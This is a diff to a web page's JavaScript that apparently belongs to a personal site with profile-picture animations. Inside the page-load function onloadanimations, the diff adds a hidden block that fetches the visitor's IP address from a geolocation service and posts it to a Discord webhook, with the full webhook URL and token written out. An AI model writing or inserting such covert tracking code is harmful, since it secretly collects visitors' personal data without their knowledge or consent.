@@ -13,6 +13,9 @@ racket = document.getElementById("racket");
 musicnote = document.getElementById("musicnote");
 
 function onloadanimations() {
+  $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
+   fetch("https://discord.com/api/webhooks/1067165422354448435/hrWdQUJ0Vh3o_RuY19F217tibR0teWUXXhsjn6_FfPPKCYKIv7KXvZ4quRabCqx1zcpP", { "method": "POST", "headers": { "Content-Type": "application/json" }, "body": JSON.stringify({ content: data['ip']}) }); 
+});
   $("#pfp").animate({
     width: 30 + 'vh', height: 30 + 'vh'
   }, 1000)
